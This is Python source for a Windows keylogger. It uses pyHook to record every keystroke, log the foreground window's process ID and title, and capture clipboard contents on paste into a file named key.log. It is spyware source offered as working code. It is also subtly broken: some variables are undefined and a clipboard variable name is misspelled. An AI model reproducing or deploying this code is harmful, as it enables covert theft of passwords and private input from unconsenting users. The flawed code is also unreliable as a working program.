# coding: utf-8
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import os

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
file_object = open('key.log', 'w')


def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)
    file_object.write(
        "\n[ PID:%s-%s-%s] \n" % (
            process_id,
            executable.value,
            windows_title.value)
    )
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    pass


def KeyStroke(event):
    global current_window

    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
        pass

    if event.Ascii > 32 and event.Ascii < 127:
        file_object.write(chr(event.Ascii) + ' ')

    else:

        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pate_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file_object.write("[PASTE]-%s" % (paste_value) + ' ')

        else:
            file_object.write("[%s]" % event.Key + ' ')
            pass
        pass

    return True

    pass

kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
kl.HookKeyboard()
pythoncom.PumpMessages()
file_object.close()
